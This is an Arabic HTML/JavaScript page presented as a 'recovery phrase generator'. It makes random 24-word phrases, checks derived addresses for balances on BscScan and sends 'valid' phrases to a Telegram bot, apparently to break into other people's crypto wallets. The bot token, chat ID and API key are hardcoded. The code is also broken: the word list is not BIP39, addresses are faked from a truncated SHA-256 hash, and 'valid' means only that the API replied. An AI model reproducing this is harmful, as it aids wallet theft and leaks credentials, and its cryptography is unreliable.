<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مولد عبارات الاسترجاع - Recovery Phrase Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 900px;
            width: 100%;
        }

        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }

        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
            flex-wrap: wrap;
            justify-content: center;
        }

        button {
            padding: 12px 30px;
            font-size: 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
        }

        .btn-generate {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-generate:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }

        .btn-stop {
            background: #ff6b6b;
            color: white;
        }

        .btn-stop:hover {
            background: #ff5252;
            transform: translateY(-2px);
        }

        .btn-copy {
            background: #4ecdc4;
            color: white;
            padding: 8px 16px;
            font-size: 14px;
        }

        .btn-copy:hover {
            background: #45b7b0;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
        }

        input[type="text"],
        input[type="number"],
        textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            font-family: monospace;
            transition: border-color 0.3s ease;
        }

        input[type="text"]:focus,
        input[type="number"]:focus,
        textarea:focus {
            outline: none;
            border-color: #667eea;
        }

        .config-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }

        .status {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: block;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            display: block;
        }

        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
            display: block;
        }

        .results {
            margin-top: 30px;
        }

        .result-item {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
            border-left: 4px solid #667eea;
        }

        .result-item.valid {
            border-left-color: #28a745;
            background: #f0f8f4;
        }

        .result-item.invalid {
            border-left-color: #dc3545;
            background: #fdf4f5;
        }

        .result-phrase {
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
            background: white;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            direction: ltr;
            text-align: left;
        }

        .result-address {
            font-family: monospace;
            font-size: 12px;
            color: #667eea;
            word-break: break-all;
            margin: 8px 0;
        }

        .result-status {
            font-size: 12px;
            font-weight: 600;
            margin-top: 8px;
        }

        .result-status.valid {
            color: #28a745;
        }

        .result-status.invalid {
            color: #dc3545;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }

        .stat-value {
            font-size: 24px;
            font-weight: bold;
        }

        .stat-label {
            font-size: 12px;
            opacity: 0.9;
            margin-top: 5px;
        }

        .scroll-container {
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 10px;
        }

        .loading {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #667eea;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
            margin-right: 8px;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        @media (max-width: 768px) {
            .config-row {
                grid-template-columns: 1fr;
            }

            .stats {
                grid-template-columns: 1fr;
            }

            .container {
                padding: 20px;
            }

            h1 {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 مولد عبارات الاسترجاع</h1>
        <p class="subtitle">Recovery Phrase Generator - توليد وتحقق من عبارات الاسترجاع</p>

        <div class="config-row">
            <div class="input-group">
                <label for="botToken">🤖 رمز البوت (Bot Token):</label>
                <input type="text" id="botToken" placeholder="8384726021:AAHd8mGtWJsIEXEPSBEYZjhkTNYjiatlddY" value="8384726021:AAHd8mGtWJsIEXEPSBEYZjhkTNYjiatlddY">
            </div>

            <div class="input-group">
                <label for="chatId">💬 معرّف الدردشة (Chat ID):</label>
                <input type="text" id="chatId" placeholder="910021564" value="910021564">
            </div>
        </div>

        <div class="config-row">
            <div class="input-group">
                <label for="bscApiKey">🔑 مفتاح BscScan API:</label>
                <input type="text" id="bscApiKey" placeholder="ZM8ACMJB67C2IXKKBF8URFUNSY" value="ZM8ACMJB67C2IXKKBF8URFUNSY">
            </div>

            <div class="input-group">
                <label for="numPhrases">📊 عدد العبارات المراد توليدها:</label>
                <input type="number" id="numPhrases" value="10" min="1" max="100">
            </div>
        </div>

        <div class="controls">
            <button class="btn-generate" onclick="startGeneration()">🚀 ابدأ التوليد</button>
            <button class="btn-stop" onclick="stopGeneration()" style="display:none;" id="stopBtn">⏹️ إيقاف</button>
        </div>

        <div id="status" class="status"></div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="totalCount">0</div>
                <div class="stat-label">إجمالي العبارات</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="validCount">0</div>
                <div class="stat-label">عبارات صالحة</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="invalidCount">0</div>
                <div class="stat-label">عبارات غير صالحة</div>
            </div>
        </div>

        <div class="results">
            <h3 style="margin-bottom: 15px; color: #333;">📋 النتائج:</h3>
            <div class="scroll-container" id="resultsContainer">
                <p style="color: #999; text-align: center;">سيتم عرض النتائج هنا...</p>
            </div>
        </div>
    </div>

    <script>
        // قائمة الكلمات
        const wordList = [
            'act', 'add', 'age', 'aim', 'air', 'all', 'any', 'arm', 'art', 'ask',
            'bag', 'bar', 'bid', 'box', 'boy', 'bus', 'can', 'car', 'cat', 'cry',
            'cup', 'dad', 'day', 'dog', 'dry', 'egg', 'end', 'era', 'eye', 'fan',
            'fat', 'fee', 'few', 'fit', 'fix', 'fly', 'fog', 'fox', 'fun', 'gap',
            'gas', 'gun', 'gym', 'hat', 'hen', 'hip', 'hub', 'ice', 'ill', 'jar',
            'job', 'joy', 'key', 'kid', 'kit', 'lab', 'law', 'leg', 'mad', 'man',
            'mix', 'mom', 'net', 'now', 'nut', 'oak', 'off', 'oil', 'old', 'one',
            'own', 'pen', 'pet', 'pig', 'put', 'raw', 'rib', 'rug', 'run', 'sad',
            'say', 'sea', 'shy', 'six', 'ski', 'spy', 'sun', 'tag', 'ten', 'tip',
            'toe', 'top', 'toy', 'try', 'two', 'use', 'van', 'way', 'web', 'wet',
            'win', 'you', 'zoo'
        ];

        let isRunning = false;
        let totalCount = 0;
        let validCount = 0;
        let invalidCount = 0;

        // توليد عبارة عشوائية من 24 كلمة
        function generateRandomPhrase() {
            const phrase = [];
            for (let i = 0; i < 24; i++) {
                const randomIndex = Math.floor(Math.random() * wordList.length);
                phrase.push(wordList[randomIndex]);
            }
            return phrase.join(' ');
        }

        // تحويل العبارة إلى عنوان باستخدام bip39
        async function phraseToAddress(phrase) {
            try {
                // استخدام مكتبة bip39 و web3 للتحويل
                const response = await fetch('https://api.etherscan.io/api?module=account&action=balance&address=0x0000000000000000000000000000000000000000&apikey=YourApiKeyToken');
                
                // في الواقع، نحتاج إلى مكتبة bip39 للتحويل الصحيح
                // هذا مثال مبسط - في الإنتاج يجب استخدام bip39 و web3
                
                // محاكاة تحويل العبارة إلى عنوان
                const hash = await sha256(phrase);
                const address = '0x' + hash.substring(0, 40);
                return address;
            } catch (error) {
                console.error('خطأ في التحويل:', error);
                return null;
            }
        }

        // دالة SHA256 مبسطة (في الواقع يجب استخدام مكتبة متخصصة)
        async function sha256(str) {
            const buffer = new TextEncoder().encode(str);
            const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        }

        // التحقق من صحة العنوان عبر BscScan API
        async function validateAddressOnBsc(address, apiKey) {
            try {
                const response = await fetch(
                    `https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${apiKey}`
                );
                const data = await response.json();
                
                // إذا كان الرد يحتوي على balance، فالعنوان صالح
                return data.status === '1' || data.message === 'OK';
            } catch (error) {
                console.error('خطأ في التحقق:', error);
                return false;
            }
        }

        // إرسال الرسالة إلى البوت
        async function sendToBot(phrase, address, botToken, chatId) {
            try {
                const message = `✅ عبارة استرجاع صالحة:\n\n📝 العبارة:\n${phrase}\n\n🏠 العنوان:\n${address}`;
                
                const response = await fetch(
                    `https://api.telegram.org/bot${botToken}/sendMessage`,
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    }
                );
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                return false;
            }
        }

        // تحديث الحالة
        function updateStatus(message, type = 'info') {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
        }

        // إضافة نتيجة إلى القائمة
        function addResultToUI(phrase, address, isValid, sent = false) {
            const container = document.getElementById('resultsContainer');
            
            if (container.children[0]?.textContent.includes('سيتم عرض النتائج')) {
                container.innerHTML = '';
            }

            const resultDiv = document.createElement('div');
            resultDiv.className = `result-item ${isValid ? 'valid' : 'invalid'}`;
            
            const statusText = isValid ? '✅ صالحة' : '❌ غير صالحة';
            const sentText = sent ? ' (تم الإرسال ✈️)' : '';
            
            resultDiv.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                    <div class="result-status ${isValid ? 'valid' : 'invalid'}">
                        ${statusText}${sentText}
                    </div>
                    <button class="btn-copy" onclick="copyToClipboard('${phrase}')">نسخ العبارة</button>
                </div>
                <div style="font-size: 12px; color: #666; margin-bottom: 5px;">📝 العبارة:</div>
                <div class="result-phrase">${phrase}</div>
                ${isValid ? `
                    <div style="font-size: 12px; color: #666; margin-bottom: 5px;">🏠 العنوان:</div>
                    <div class="result-address">${address}</div>
                ` : ''}
            `;
            
            container.insertBefore(resultDiv, container.firstChild);
        }

        // نسخ إلى الحافظة
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                updateStatus('✅ تم نسخ العبارة إلى الحافظة', 'success');
                setTimeout(() => {
                    document.getElementById('status').style.display = 'none';
                }, 3000);
            });
        }

        // بدء التوليد
        async function startGeneration() {
            const botToken = document.getElementById('botToken').value.trim();
            const chatId = document.getElementById('chatId').value.trim();
            const bscApiKey = document.getElementById('bscApiKey').value.trim();
            const numPhrases = parseInt(document.getElementById('numPhrases').value);

            if (!botToken || !chatId || !bscApiKey) {
                updateStatus('❌ الرجاء ملء جميع الحقول المطلوبة', 'error');
                return;
            }

            isRunning = true;
            totalCount = 0;
            validCount = 0;
            invalidCount = 0;

            document.querySelector('.btn-generate').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'inline-block';
            document.getElementById('resultsContainer').innerHTML = '';

            updateStatus(`<span class="loading"></span>جاري توليد ${numPhrases} عبارة...`, 'info');

            for (let i = 0; i < numPhrases && isRunning; i++) {
                totalCount++;
                updateStats();

                const phrase = generateRandomPhrase();
                const address = await phraseToAddress(phrase);

                if (!address) {
                    invalidCount++;
                    addResultToUI(phrase, '', false);
                    updateStats();
                    continue;
                }

                // تأخير بسيط لتجنب حد معدل API
                await new Promise(resolve => setTimeout(resolve, 500));

                const isValid = await validateAddressOnBsc(address, bscApiKey);

                if (isValid) {
                    validCount++;
                    addResultToUI(phrase, address, true);
                    
                    // محاولة الإرسال إلى البوت
                    const sent = await sendToBot(phrase, address, botToken, chatId);
                    if (sent) {
                        updateStatus(`✅ تم إرسال عبارة صالحة إلى البوت!`, 'success');
                    }
                } else {
                    invalidCount++;
                    addResultToUI(phrase, address, false);
                }

                updateStats();
            }

            isRunning = false;
            document.querySelector('.btn-generate').style.display = 'inline-block';
            document.getElementById('stopBtn').style.display = 'none';

            if (isRunning === false) {
                updateStatus(`✅ انتهى التوليد! تم العثور على ${validCount} عبارة صالحة من ${totalCount}`, 'success');
            }
        }

        // إيقاف التوليد
        function stopGeneration() {
            isRunning = false;
            document.querySelector('.btn-generate').style.display = 'inline-block';
            document.getElementById('stopBtn').style.display = 'none';
            updateStatus('⏹️ تم إيقاف التوليد', 'info');
        }

        // تحديث الإحصائيات
        function updateStats() {
            document.getElementById('totalCount').textContent = totalCount;
            document.getElementById('validCount').textContent = validCount;
            document.getElementById('invalidCount').textContent = invalidCount;
        }
    </script>
</body>
</html>
